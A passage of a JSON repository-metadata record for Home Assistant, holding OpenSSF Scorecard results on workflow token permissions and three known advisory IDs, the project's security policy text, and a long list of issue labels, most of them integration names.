                        "Warn: no topLevel permission defined: .github/workflows/builder.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/codeql.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/lock.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/stale.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/translations.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/wheels.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": [
                        "Warn: Project is vulnerable to: GHSA-248v-346w-9cwc",
                        "Warn: Project is vulnerable to: GHSA-43fp-rhv2-5gv8 / PYSEC-2022-42986",
                        "Warn: Project is vulnerable to: GHSA-xqr8-7jwr-rhp7 / PYSEC-2023-135"
                    ],
                    "score": 7,
                    "reason": "3 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/home-assistant/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\nInformation on Home Assistant's security policies and guidelines\ncan be found on our website:\n\n<https://www.home-assistant.io/security>\n",
        "project_all_labels": [
            "ai-review",
            "almost-done",
            "async",
            "auth",
            "awaiting-frontend",
            "blocking event loop",
            "bluetooth-range-interference",
            "board/raspberrypi",
            "breaking-change",
            "bug",
            "bugfix",
            "by-code-owner",
            "by-core-dev",
            "cherry-picked",
            "ci-full-run",
            "ci-keep-cache",
            "cla-error",
            "cla-needed",
            "cla-recheck",
            "cla-signed",
            "cleanup",
            "climate",
            "code-owner-approved",
            "code-quality",
            "component",
            "config error",
            "config-flow",
            "core",
            "cpu",
            "custom component",
            "database: mariadb",
            "database: mysql",
            "database: postgresql",
            "database: sqlite3",
            "dependency",
            "dependency-bump",
            "deprecation",
            "docker",
            "docs-missing",
            "documentation",
            "duplicate",
            "easy-fix",
            "energy",
            "enhancement",
            "feature-request",
            "flapping-test",
            "For Paulus",
            "frontend",
            "github_actions",
            "good first issue",
            "Hacktoberfest",
            "hacktoberfest-accepted",
            "hardware",
            "has parent issue",
            "has-tests",
            "help-wanted",
            "http",
            "import-deadlock",
            "in progress",
            "integration: __init__",
            "integration: .translations",
            "integration: 1_domintell",
            "integration: 2_domintell",
            "integration: 2n_entrycom",
            "integration: 3_day_blinds",
            "integration: abode",
            "integration: acaia",
            "integration: accuweather",
            "integration: acer_projector",
            "integration: acmeda",
            "integration: acomax",
            "integration: action",
            "integration: actiontec",
            "integration: adaptive_lighting",
            "integration: adax",
            "integration: adguard",
            "integration: ads",
            "integration: advantage_air",
            "integration: aemet",
            "integration: aep_ohio",
            "integration: aep_texas",
            "integration: aepohio",
            "integration: aeptexas",
            "integration: aftership",
            "integration: afvalwijzer",
            "integration: agent_dvr",
            "integration: ai_speaker",
            "integration: aidot",
            "integration: air_pollutants",
            "integration: air_quality",
            "integration: aircube",
            "integration: airgradient",
            "integration: airly",
            "integration: airnow",
            "integration: airq",
            "integration: airscape",
            "integration: airthings",
            "integration: airthings_ble",
            "integration: airtouch4",
            "integration: airtouch5",
            "integration: airvisual",
            "integration: airvisual_pro",
            "integration: airzone",
            "integration: airzone_cloud",
            "integration: ais_tracker",
            "integration: aladdin_connect",
            "integration: aladdin_genie",
            "integration: alarm_clock",
            "integration: alarm_control_panel",
            "integration: alarmdecoder",
            "integration: alarmdotcom",
            "integration: alert",
            "integration: alex_test",
            "integration: alexa",
            "integration: alexa_media",
            "integration: alfa",
            "integration: alfawise",
            "integration: alidns",
            "integration: allpowers_ble",
            "integration: almond",
            "integration: alpha_vantage",
            "integration: alphaess",
            "integration: amazon_polly",
            "integration: amazon_rekognition",
            "integration: ambee",
            "integration: amberelectric",
            "integration: ambiclimate",
            "integration: ambient_network",
            "integration: ambient_station",
            "integration: amcrest",
            "integration: ampio",
            "integration: analog_output",
            "integration: analytics",
            "integration: analytics_insights",
            "integration: android",
            "integration: android_battery",
            "integration: android_ip_webcam",
            "integration: androidtv",
            "integration: androidtv_remote",
            "integration: anel_pwrctrl",
            "integration: anglian_water",
            "integration: anomaly",
            "integration: anova",
            "integration: anova_cooker",
            "integration: anova_sous_vide",
            "integration: anthemav",
            "integration: anthropic",
            "integration: anwb_energie",
            "integration: aosmith",
            "integration: apache_kafka",
            "integration: apcupsd",
            "integration: api",
            "integration: api_streams",
            "integration: apiai",
            "integration: apns",
            "integration: appalachianpower",
            "integration: appartme",
            "integration: apple_tv",
            "integration: application_credentials",
            "integration: apprise",
            "integration: aprilaire",
            "integration: aprs",
            "integration: aps",
            "integration: apsystems",
            "integration: aqara",
            "integration: aquacell",
            "integration: aqualogic",
            "integration: aquostv",
            "integration: aqvify",
            "integration: aranet",
            "integration: aranet4",
            "integration: arcam_fmj",
            "integration: arcticspa",
            "integration: arduino",
            "integration: arest",
            "integration: arlo",
            "integration: arris_tg2492lg",
            "integration: artsound",
            "integration: aruba",
            "integration: aruba_instant",
            "integration: aruba_instant_on",
            "integration: arve",
            "integration: arwn",
            "integration: aseko_pool_live",
            "integration: assist_pipeline",
            "integration: assist_satellite",
            "integration: asterisk_ami",
            "integration: asterisk_cdr",
            "integration: asterisk_mbox",
            "integration: asus_router",
            "integration: asuswrt",
            "integration: asyncua",
            "integration: atag",
            "integration: aten_pe",
            "integration: atlona_juno",
            "integration: atome",
            "integration: attribute_as_sensor",
            "integration: attribute_sensor",
            "integration: attributes",
            "integration: audiconnect",
            "integration: august",
            "integration: aurora",
            "integration: aurora_abb_powerone",
            "integration: aussie_broadband",
            "integration: autarco",
            "integration: auth",
            "integration: auth_api",
            "integration: automate",
            "integration: automatic",
            "integration: automation",
            "integration: avea",
            "integration: avion",
            "integration: avocent_dpdu",
            "integration: avreceiver",
            "integration: avri",
            "integration: awair",
            "integration: awair_local",
            "integration: awattar",
            "integration: aws",
            "integration: aws_data",
            "integration: aws_lambda",
            "integration: aws_sns",
            "integration: aws_sqs",
            "integration: axion_dmx",
            "integration: axis",
            "integration: azure_cloud",
            "integration: azure_data_explorer",
            "integration: azure_devops",
            "integration: azure_event_hub",
            "integration: azure_maps_travel_time",
            "integration: azure_openai_conversation",
            "integration: azure_service_bus",
            "integration: azure_servicebus",
            "integration: azure_vm",
            "integration: azuredns",
            "integration: backup",
            "integration: baf",
            "integration: baidu",
            "integration: balboa",
            "integration: ban",
            "integration: bang_olufsen",
            "integration: bangolufsen",
            "integration: barry",
            "integration: battery_sim",
            "integration: bayesian",
            "integration: bbb_gpio",
            "integration: bbox",
            "integration: becker",
            "integration: bedrock_agent",
            "integration: beewi_smartclim",
            "integration: bemfa",
            "integration: benq_projector",
            "integration: bh1750",
            "integration: binance",
            "integration: binary_max_sensor",
            "integration: binary_sensor",
            "integration: binary_sensor_as_x",
            "integration: bitcoin",
            "integration: bittrex",
            "integration: bitvavo",
            "integration: bizkaibus",
            "integration: bkk",
            "integration: blackbird",
            "integration: blastbot_cloud",
            "integration: blebox",
            "integration: blink",
            "integration: blinksticklight",
            "integration: blinkt",
            "integration: blnet",
            "integration: blockchain",
            "integration: bloomsky",
            "integration: blue_current",
            "integration: bluecurrent",
            "integration: bluemaestro",
            "integration: blueprint",
            "integration: bluesound",
            "integration: bluetooth",
            "integration: bluetooth_le_tracker",
            "integration: bluetooth_tracker",
            "integration: bme280",
            "integration: bme280spi",
            "integration: bme680",
            "integration: bmp280",
            "integration: bmw_connected_drive",
            "integration: bom",
            "integration: bomradarcam",
            "integration: bomradarloop",
            "integration: bond",
            "integration: bosch_shc",
            "integration: bouncie",
            "integration: braviatv",
            "integration: brightsky",
            "integration: bring",
            "integration: broadcast",
            "integration: broadlink",
            "integration: broadlinkcustom",
            "integration: broadlinkRM3",
            "integration: brother",
            "integration: brottsplatskartan",
            "integration: browan",
            "integration: browser",
            "integration: brunt",
            "integration: bryant_evolution",
            "integration: bsblan",
            "integration: bt_home_hub_5",
            "integration: bt_smarthub",
            "integration: bthome",
            "integration: bthome_ble",
            "integration: buienradar",
            "integration: bunq",
            "integration: button",
            "integration: bzutech",
            "integration: c_by_ge",
            "integration: c_Elta",
            "integration: caldav",
            "integration: calendar",
            "integration: cambridge_audio",
            "integration: cambridgeaudio",
            "integration: came_domotic",
            "integration: camect",
            "integration: camera",
            "integration: canada_hydrometric",
            "integration: canary",
            "integration: carson",
            "integration: casatunes",
            "integration: cast",
            "integration: ccm15",
            "integration: cert_expiry",
            "integration: chacon_dio",
            "integration: channels",
            "integration: charge_place_scotland",
            "integration: circuit",
            "integration: cisco_ios",
            "integration: cisco_mobility_express",
            "integration: cisco_webex",
            "integration: cisco_webex_teams",
            "integration: ciscospark",
            "integration: citybikes",
            "integration: citybus",
            "integration: clarifai",
            "integration: clarifai_general",
            "integration: classificationbox",
            "integration: clementine",
            "integration: clickatell",
            "integration: clicksend",
            "integration: clicksend_tts",
            "integration: clicksendaudio",
            "integration: clicksendtts",
            "integration: climacell",
            "integration: climate",
            "integration: climate_scheduler",
            "integration: climaveneta_ilife",
            "integration: climaveneta_imxw",
            "integration: cloud",
            "integration: cloud_api",
            "integration: cloudflare",
            "integration: cmus",
            "integration: co2mini",
            "integration: co2signal",
            "integration: coautilities",
            "integration: coinbase",
            "integration: coinmarketcap",
            "integration: color_extractor",
            "integration: colorthief",
            "integration: combined_energy",
            "integration: combined_energy_api",
            "integration: comed_hourly_pricing",
            "integration: comelit",
            "integration: comexio",
            "integration: comfoair",
            "integration: comfoconnect",
            "integration: command_line",
            "integration: compensation",
            "integration: concord232",
            "integration: coned",
            "integration: config",
            "integration: config_entry_example",
            "integration: configurator",
            "integration: connectedcars",
            "integration: connector",
            "integration: contact_energy_nz",
            "integration: contec_controllers",
            "integration: control4",
            "integration: conversation",
            "integration: coolmaster",
            "integration: coolmaster_serial",
            "integration: core",
            "integration: coronavirus",
            "integration: counter",
            "integration: cover",
            "integration: cppm_tracker",
            "integration: cpuspeed",
            "integration: crestron",
            "integration: cribl",
            "integration: crimereports",
            "integration: crownstone",
            "integration: csv",
            "integration: cups",
            "integration: currencylayer",
            "integration: custom_card",
            "integration: customize",
            "integration: cybro",
            "integration: dahua",
            "integration: daikin",
            "integration: daikin_madoka",
            "integration: daily_min_max",
            "integration: danfoss_air",
            "integration: darksky",
            "integration: data_source",
            "integration: datadog",
            "integration: date",
            "integration: date_countdown",
            "integration: date_reminder",
            "integration: datetime",
            "integration: ddns_ovh",
            "integration: ddwrt",
            "integration: deako",
            "integration: debugpy",
            "integration: deconz",
            "integration: decora",
            "integration: decora_ble",
            "integration: decora_wifi",
            "integration: default_config",
            "integration: delegate_media_player",
            "integration: delijn",
            "integration: deluge",
            "integration: demo",
            "integration: denon",
            "integration: denonavr",
            "integration: depict",
            "integration: derivative",
            "integration: deutsche_bahn",
            "integration: developer_credentials",
            "integration: devialet",
            "integration: device",
            "integration: device_automation",
            "integration: device_sun_light_trigger",
            "integration: device_tracker",
            "integration: devolo_home_control",
            "integration: devolo_home_network",
            "integration: dewpoint",
            "integration: dexcom",
            "integration: dgarage",
            "integration: dhcp",
            "integration: dht",
            "integration: diagnostics",
            "integration: dialogflow",
            "integration: digital_ocean",
            "integration: digitalloggers",
            "integration: dio_chacon",
            "integration: directv",
            "integration: dirigera",
            "integration: discal",
            "integration: discogs",
            "integration: discord",
            "integration: discovergy",
            "integration: discovery",
            "integration: dispatcher",
            "integration: dlib_face_detect",
            "integration: dlib_face_identify",
            "integration: dlink",
            "integration: dlna_dmr",
            "integration: dlna_dms",
            "integration: dnsip",
            "integration: domain_expiry",
            "integration: domika",
            "integration: dominionenergy",
            "integration: dominos",
            "integration: doods",
            "integration: doorbird",
            "integration: dormakaba_dkey",
            "integration: dovado",
            "integration: downloader",
            "integration: dpi4relay",
            "integration: dremel_3d_printer",
            "integration: dreo",
            "integration: drone_mobile",
            "integration: drop",
            "integration: drop_connect",
            "integration: dsmr",
            "integration: dsmr_reader",
            "integration: dte_energy_bridge",
            "integration: dublin_bus_transport",
            "integration: duckdns",
            "integration: duke_energy",
            "integration: dunehd",
            "integration: duotecno",
            "integration: duquesne_light",
            "integration: duwi",
            "integration: dwd_warnapp",
            "integration: dwd_weather_warnings",
            "integration: dweet",
            "integration: dynalite",
            "integration: dyson",
            "integration: dyson_local",
            "integration: e3dc_modbus",
            "integration: eafm",
            "integration: easee",
            "integration: eastron",
            "integration: easyenergy",
            "integration: ebox",
            "integration: ebus",
            "integration: ebusd",
            "integration: ecoal_boiler",
            "integration: ecobee",
            "integration: ecodevices",
            "integration: ecoforest",
            "integration: econet",
            "integration: ecoplug",
            "integration: ecovacs",
            "integration: ecowitt",
            "integration: ecowitt_weather",
            "integration: eddystone_temperature",
            "integration: edilkamin",
            "integration: edimax",
            "integration: edl21",
            "integration: edp_redy",
            "integration: ee_brightbox",
            "integration: efergy",
            "integration: efesto",
            "integration: egardia",
            "integration: egps",
            "integration: eheimdigital",
            "integration: eight_sleep",
            "integration: elan",
            "integration: electraac",
            "integration: electrasmart",
            "integration: electric_kiwi",
            "integration: elevenlabs",
            "integration: elevenlabstts",
            "integration: elgato",
            "integration: eliqonline",
            "integration: elkm1",
            "integration: elmax",
            "integration: elmo_alarm",
            "integration: elro_connects",
            "integration: elv",
            "integration: elv_usb_wde",
            "integration: elvia",
            "integration: emby",
            "integration: emoncms",
            "integration: emoncms_history",
            "integration: emonitor",
            "integration: emulated_hue",
            "integration: emulated_kasa",
            "integration: emulated_roku",
            "integration: enasolar",
            "integration: energenie",
            "integration: energie_vanons",
            "integration: energy",
            "integration: energyid",
            "integration: energyzero",
            "integration: enertalk",
            "integration: enigma",
            "integration: enigma2",
            "integration: enmax",
            "integration: enocean",
            "integration: enphase_envoy",
            "integration: entur_public_transport",
            "integration: environment_canada",
            "integration: envirophat",
            "integration: envisalink",
            "integration: ephember",
            "integration: epic_games_store",
            "integration: epion",
            "integration: eps",
            "integration: epson",
            "integration: epsonprinter",
            "integration: epsonworkforce",
            "integration: epsonworkforceprinter",
            "integration: eq3btsmart",
            "integration: escea",
            "integration: esera_onewire",
            "integration: esphome",
            "integration: essent",
            "integration: etherrain",
            "integration: etherscan",
            "integration: eufy",
            "integration: eufy_security",
            "integration: eufylife_ble",
            "integration: event",
            "integration: everlights",
            "integration: evil_genius_labs",
            "integration: evohome",
            "integration: evse_wifi",
            "integration: eyeonwater",
            "integration: ezbeq",
            "integration: ezviz",
            "integration: ezviz_cloud",
            "integration: faa_delays",
            "integration: faadelays",
            "integration: facebook",
            "integration: facebox",
            "integration: facebox_face_detect",
            "integration: fail2ban",
            "integration: familyhub",
            "integration: fan",
            "integration: fastdotcom",
            "integration: fatek",
            "integration: fedex",
            "integration: feedreader",
            "integration: ferienapidotde",
            "integration: fever_smart",
            "integration: ffmpeg",
            "integration: ffmpeg_motion",
            "integration: ffmpeg_noise",
            "integration: fhz",
            "integration: fibaro",
            "integration: fido",
            "integration: file",
            "integration: file_upload",
            "integration: filesize",
            "integration: filter",
            "integration: fing",
            "integration: fints",
            "integration: fire_tv",
            "integration: fireservicerota",
            "integration: firetv",
            "integration: firmata",
            "integration: fitbit",
            "integration: fivem",
            "integration: fixer",
            "integration: fjaraskupan",
            "integration: flaktgroup",
            "integration: flashforge",
            "integration: fleetgo",
            "integration: flexit",
            "integration: flexit_bacnet",
            "integration: flexmeasures",
            "integration: flexpool",
            "integration: flic",
            "integration: flick_electric",
            "integration: flickelectric",
            "integration: flipr",
            "integration: flo",
            "integration: flock",
            "integration: flukso",
            "integration: flume",
            "integration: flunearyou",
            "integration: fluss",
            "integration: flux",
            "integration: flux_led",
            "integration: fmi",
            "integration: folder",
            "integration: folder_watcher",
            "integration: foobar",
            "integration: foobot",
            "integration: fordpass",
            "integration: forecast_solar",
            "integration: forked_daapd",
            "integration: formula_one",
            "integration: fortigate",
            "integration: fortinet_fortios",
            "integration: fortios",
            "integration: foscam",
            "integration: foursquare",
            "integration: fpl",
            "integration: frank_energie",
            "integration: free_mobile",
            "integration: freebox",
            "integration: freedns",
            "integration: freedompro",
            "integration: frigidaire",
            "integration: fritz",
            "integration: fritzbox",
            "integration: fritzbox_callmonitor",
            "integration: fritzbox_netmonitor",
            "integration: fronius",
            "integration: frontend",
            "integration: frontier_silicon",
            "integration: fs20",
            "integration: fujitsu_anywair",
            "integration: fujitsu_fglair",
            "integration: fujitsu_hvac",
            "integration: fully_kiosk",
            "integration: fullykiosk",
            "integration: futurenow",
            "integration: fuzzy",
            "integration: fyta",
            "integration: gandi_livedns",
            "integration: garadget",
            "integration: garages_amsterdam",
            "integration: gardena",
            "integration: gardena_bluetooth",
            "integration: garmin_connect",
            "integration: gc100",
            "integration: gdacs",
            "integration: ge_home",
            "integration: gearbest",
            "integration: geizhals",
            "integration: generic",
            "integration: generic_hygrostat",
            "integration: generic_thermostat",
            "integration: geniushub",
            "integration: geo_json_events",
            "integration: geo_location",
            "integration: geo_rss_events",
            "integration: geocaching",
            "integration: geofency",
            "integration: geonetnz_quakes",
            "integration: geonetnz_volcano",
            "integration: gios",
            "integration: github",
            "integration: gitlab_ci",
            "integration: gitter",
            "integration: glances",
            "integration: glinet",
            "integration: gntp",
            "integration: go2rtc",
            "integration: goalfeed",
            "integration: goalzero",
            "integration: gocr",
            "integration: godice",
            "integration: goe_charger",
            "integration: gogogate2",
            "integration: goodwe",
            "integration: google",
            "integration: google_assistant",
            "integration: google_assistant_sdk",
            "integration: google_calendar",
            "integration: google_cloud",
            "integration: google_domains",
            "integration: google_drive",
            "integration: google_generative_ai_conversation",
            "integration: google_home_alarm",
            "integration: google_mail",
            "integration: google_maps",
            "integration: google_photos",
            "integration: google_pubsub",
            "integration: google_reverse_geocode",
            "integration: google_sdm",
            "integration: google_sheets",
            "integration: google_stackdriver",
            "integration: google_tasks",
            "integration: google_translate",
            "integration: google_travel_time",
            "integration: google_travel_time_llm_api",
            "integration: google_wifi",
            "integration: googleactions",
            "integration: googlehome",
            "integration: gotify",
            "integration: govee",
            "integration: govee_api",
            "integration: govee_ble",
            "integration: govee_light_api",
            "integration: govee_light_local",
            "integration: gpm",
            "integration: gpmdp",
            "integration: gpsd",
            "integration: gpslogger",
            "integration: gpstracker",
            "integration: graphite",
            "integration: gree",
            "integration: greeneye_monitor",
            "integration: greenwave",
            "integration: griddy",
            "integration: group",
            "integration: group_state",
            "integration: grouped_light",
            "integration: growatt",
            "integration: growatt_rs232",
            "integration: growatt_server",
            "integration: gstreamer",
            "integration: gtfs",
            "integration: gtt",
            "integration: guardian",
            "integration: ha_alerts",
            "integration: habitica",
            "integration: habo",
            "integration: hadockermon",
            "integration: hafas",
            "integration: Haiku",
            "integration: halohome",
            "integration: hangouts",
            "integration: hardkernel",
            "integration: hardware",
            "integration: harman_kardon_avr",
            "integration: harmony",
            "integration: hasl",
            "integration: hassbian",
            "integration: hassio",
            "integration: hassmpris",
            "integration: hatchrest",
            "integration: hausbus",
            "integration: haveibeenpwned",
            "integration: hddtemp",
            "integration: hdmi_cec",
            "integration: heatilator",
            "integration: heatmiser",
            "integration: heatnglo",
            "integration: heatzy",
            "integration: hegel",
            "integration: helpers",
            "integration: heos",
            "integration: here_travel_time",
            "integration: here_weather",
            "integration: hifiberry",
            "integration: hikvision",
            "integration: hikvisioncam",
            "integration: hipchat",
            "integration: hisense_aehw4a1",
            "integration: history",
            "integration: history_average",
            "integration: history_graph",
            "integration: history_stats",
            "integration: history_values",
            "integration: hitron_coda",
            "integration: hive",
            "integration: hiwifi",
            "integration: hko",
            "integration: hlk_sw16",
            "integration: hm3301",
            "integration: holiday",
            "integration: home_connect",
            "integration: home_panel",
            "integration: home_plus_control",
            "integration: homeassistant",
            "integration: homeassistant_alerts",
            "integration: homeassistant_analytics",
            "integration: homeassistant_connect_zbt1",
            "integration: homeassistant_green",
            "integration: homeassistant_hardware",
            "integration: homeassistant_sky_connect",
            "integration: homeassistant_solar_trest_se",
            "integration: homeassistant_yellow",
            "integration: homebound",
            "integration: homecom",
            "integration: homeconnect",
            "integration: homekit",
            "integration: homekit_controller",
            "integration: homely",
            "integration: homematic",
            "integration: homematicip",
            "integration: homematicip_cloud",
            "integration: homepilot",
            "integration: homepluscontrol",
            "integration: homewizard",
            "integration: homewizard_climate",
            "integration: homewizard_energy",
            "integration: homeworks",
            "integration: honeygain",
            "integration: honeywell",
            "integration: hook",
            "integration: horizon",
            "integration: hp_ilo",
            "integration: hsl",
            "integration: html5",
            "integration: http",
            "integration: http_api",
            "integration: http_inline",
            "integration: http_plaintext",
            "integration: http_rgb",
            "integration: httplight",
            "integration: htu21d",
            "integration: huawei_hilink",
            "integration: huawei_lte",
            "integration: huawei_router",
            "integration: huawei_smart_logger",
            "integration: huawei_solar",
            "integration: hue",
            "integration: hue_api",
            "integration: hue_ble",
            "integration: hue_sensors",
            "integration: huisbaasje",
            "integration: humidifier",
            "integration: humidity",
            "integration: hunter_hydrawise",
            "integration: hunterdouglas_powerview",
            "integration: husqvarna_automower",
            "integration: husqvarna_automower_ble",
            "integration: huum",
            "integration: huumtest",
            "integration: hvv_departures",
            "integration: hwam",
            "integration: hydrawise",
            "integration: hydroquebec",
            "integration: hyperion",
            "integration: hyundai_kia_connect",
            "integration: i2c",
            "integration: ialarm",
            "integration: ialarm_xr",
            "integration: ialarmxr",
            "integration: iammeter",
            "integration: iaqstick",
            "integration: iaqualink",
            "integration: ibeacon",
            "integration: icloud",
            "integration: idasen_desk",
            "integration: ids_hyyp",
            "integration: idteck_prox",
            "integration: ifttt",
            "integration: igd",
            "integration: iglo",
            "integration: ign_sismologia",
            "integration: ihc",
            "integration: ihcdevice",
            "integration: iliad_italy",
            "integration: image",
            "integration: image_processing",
            "integration: image_upload",
            "integration: imap",
            "integration: imap_email_content",
            "integration: imazu_wall_pad",
            "integration: imgw_pib",
            "integration: improv_ble",
            "integration: incharge",
            "integration: incomfort",
            "integration: indianamichiganpower",
            "integration: inels",
            "integration: influxdb",
            "integration: influxdb_cloud",
            "integration: inkbird",
            "integration: input_boolean",
            "integration: input_box",
            "integration: input_button",
            "integration: input_datetime",
            "integration: input_number",
            "integration: input_schedule",
            "integration: input_select",
            "integration: input_slider",
            "integration: input_text",
            "integration: instapush",
            "integration: insteon",
            "integration: insteon_hub",
            "integration: insteon_local",
            "integration: insteon_plm",
            "integration: instructure",
            "integration: integration",
            "integration: intellidrive",
            "integration: intellifire",
            "integration: intent",
            "integration: intent_script",
            "integration: interval",
            "integration: intesishome",
            "integration: intouch",
            "integration: introduction",
            "integration: investec",
            "integration: ios",
            "integration: iot",
            "integration: iota",
            "integration: iotawatt",
            "integration: iotmeter",
            "integration: iotty",
            "integration: iperf3",
            "integration: ipma",
            "integration: ipp",
            "integration: iqvia",
            "integration: irc",
            "integration: irish_rail_transport",
            "integration: iron_os",
            "integration: isal",
            "integration: iskra",
            "integration: islamic_prayer_times",
            "integration: israel_rail",
            "integration: iss",
            "integration: issue117263",
            "integration: ista_ecotrend",
            "integration: isy994",
            "integration: itach",
            "integration: itunes",
            "integration: ituran",
            "integration: izone",
            "integration: jellyfin",
            "integration: jenkins",
            "integration: jewish_calendar",
            "integration: jewish_shabbath",
            "integration: jlrincontrol",
            "integration: joaoapps_join",
            "integration: json_attributes",
            "integration: juhe_stock",
            "integration: juicenet",
            "integration: just_nimbus",
            "integration: justnimbus",
            "integration: jvc_projector",
            "integration: jvc_projectors",
            "integration: kaiterra",
            "integration: kaleidescape",
            "integration: kankun",
            "integration: kat_bulgaria",
            "integration: kdeconnect",
            "integration: keba",
            "integration: keenetic_ndms2",
            "integration: kef",
            "integration: kegtron",
            "integration: kentuckypower",
            "integration: kermi",
            "integration: ketra",
            "integration: keyboard",
            "integration: keyboard_remote",
            "integration: keymitt_ble",
            "integration: kincony_hx",
            "integration: kindhome_solarbeaker",
            "integration: kira",
            "integration: kitchen_sink",
            "integration: kiwi",
            "integration: klyqa",
            "integration: kmtronic",
            "integration: knocki",
            "integration: knovvu",
            "integration: knx",
            "integration: kodi",
            "integration: komfovent",
            "integration: konnected",
            "integration: koogeek",
            "integration: kostal_piko",
            "integration: kostal_plenticore",
            "integration: kraken",
            "integration: krisinformation",
            "integration: krispol",
            "integration: kulersky",
            "integration: kumo",
            "integration: kwb",
            "integration: lacrosse",
            "integration: lacrosse_view",
            "integration: lamarzocco",
            "integration: lametric",
            "integration: landisgyr_heat_meter",
            "integration: landroid_cloud",
            "integration: lannouncer",
            "integration: lastfm",
            "integration: launch_library",
            "integration: laundrify",
            "integration: lawn_mower",
            "integration: lcn",
            "integration: ld2410_ble",
            "integration: leafspy",
            "integration: leaone",
            "integration: led_ble",
            "integration: ledsc",
            "integration: legrand_rflc",
            "integration: legrandinone",
            "integration: lektrico",
            "integration: leslies_pool",
            "integration: leviosa_shades",
            "integration: lg_netcast",
            "integration: lg_soundbar",
            "integration: lg_thinq",
            "integration: lgthinq",
            "integration: liberty",
            "integration: lidarr",
            "integration: life360",
            "integration: lifesos",
            "integration: lifetime_total",
            "integration: lifx",
            "integration: lifx_cloud",
            "integration: lifx_legacy",
            "integration: light",
            "integration: light_defaults",
            "integration: lightwave",
            "integration: lightwave_energy",
            "integration: limitlessled",
            "integration: limitlessled_rf",
            "integration: linear_garage_door",
            "integration: linknlink",
            "integration: linkplay",
            "integration: linksys_ap",
            "integration: linksys_smart",
            "integration: linky",
            "integration: linode",
            "integration: linux_battery",
            "integration: lirc",
            "integration: litejet",
            "integration: litterrobot",
            "integration: livebox",
            "integration: liveboxplaytv",
            "integration: livemasjid",
            "integration: livisi",
            "integration: ll_notify",
            "integration: llamalab_automate",
            "integration: llap",
            "integration: llm_tools",
            "integration: lm75",
            "integration: local",
            "integration: local_calendar",
            "integration: local_file",
            "integration: local_ip",
            "integration: local_todo",
            "integration: localip",
            "integration: location",
            "integration: locative",
            "integration: lock",
            "integration: lockitron",
            "integration: logbook",
            "integration: logentries",
            "integration: logger",
            "integration: logi_circle",
            "integration: london_air",
            "integration: london_underground",
            "integration: lookin",
            "integration: loopenergy",
            "integration: loqed",
            "integration: lorawan",
            "integration: lovelace",
            "integration: loxone",
            "integration: luci",
            "integration: luciwifi",
            "integration: luftdaten",
            "integration: lupusec",
            "integration: lutron",
            "integration: lutron_caseta",
            "integration: lutron_qse",
            "integration: luxor",
            "integration: luxtronik",
            "integration: luxtronik2",
            "integration: lviv_poweroff",
            "integration: lw12wifi",
            "integration: lyft",
            "integration: lyric",
            "integration: madeco",
            "integration: madvr",
            "integration: magichome",
            "integration: magicseaweed",
            "integration: maico",
            "integration: mailbox",
            "integration: mailgun",
            "integration: majestic",
            "integration: manual",
            "integration: manual_mqtt",
            "integration: map",
            "integration: marytts",
            "integration: mass",
            "integration: mastodon",
            "integration: matrix",
            "integration: matter",
            "integration: mawaqit",
            "integration: maxcube",
            "integration: maxcul",
            "integration: mazda",
            "integration: mcp23017",
            "integration: mealie",
            "integration: meater",
            "integration: medcom_ble",
            "integration: media_extractor",
            "integration: media_finder",
            "integration: media_helper",
            "integration: media_manager",
            "integration: media_player",
            "integration: media_source",
            "integration: mediaroom",
            "integration: melcloud",
            "integration: melissa",
            "integration: melnor",
            "integration: meppel_afvalkalender",
            "integration: meraki",
            "integration: mercedesme",
            "integration: mercury",
            "integration: message_bird",
            "integration: met",
            "integration: met_eireann",
            "integration: met_lightning",
            "integration: meteo_france",
            "integration: meteoalarm",
            "integration: meteoclimatic",
            "integration: meteoswiss",
            "integration: metlink",
            "integration: metoffice",
            "integration: mfi",
            "integration: mhtzn",
            "integration: mhz19",
            "integration: microBees",
            "integration: microbot_push",
            "integration: micropel",
            "integration: microsoft",
            "integration: microsoft_face",
            "integration: microsoft_face_detect",
            "integration: microsoft_face_identify",
            "integration: microsoft_graph",
            "integration: microsoft_speech",
            "integration: miflora",
            "integration: migardener",
            "integration: migration",
            "integration: mijnafvalwijzer",
            "integration: mijndomein_energie",
            "integration: mikrotik",
            "integration: mikrotik_bt5",
            "integration: mikrotik_firewall",
            "integration: mill",
            "integration: mill_local",
            "integration: min_max",
            "integration: minecraft_server",
            "integration: mini_connected",
            "integration: minio",
            "integration: mint_finance",
            "integration: mipow",
            "integration: miraie_ac",
            "integration: missile_launcher",
            "integration: mitemp_bt",
            "integration: mitsubishicontroller",
            "integration: mjpeg",
            "integration: moat",
            "integration: mobile_app",
            "integration: mobilevikings_pl",
            "integration: mochad",
            "integration: modbus",
            "integration: modbus_sunspec",
            "integration: models",
            "integration: modem_callerid",
            "integration: modern_forms",
            "integration: moehlenhoff_alpha2",
            "integration: mojio",
            "integration: mold_indicator",
            "integration: molohub",
            "integration: monarch_money",
            "integration: monarchmoney",
            "integration: monessen",
            "integration: monoprice",
            "integration: monzo",
            "integration: moon",
            "integration: moonraker",
            "integration: mopar",
            "integration: mopeka",
            "integration: motion_blinds",
            "integration: motionblinds_ble",
            "integration: motioneye",
            "integration: motionmount",
            "integration: mpchc",
            "integration: mpd",
            "integration: mqtt",
            "integration: mqtt_eventstream",
            "integration: mqtt_json",
            "integration: mqtt_room",
            "integration: mqtt_statestream",
            "integration: mqtt_template",
            "integration: msteams",
            "integration: mullvad",
            "integration: multicover",
            "integration: mutesync",
            "integration: mvglive",
            "integration: my",
            "integration: mychevy",
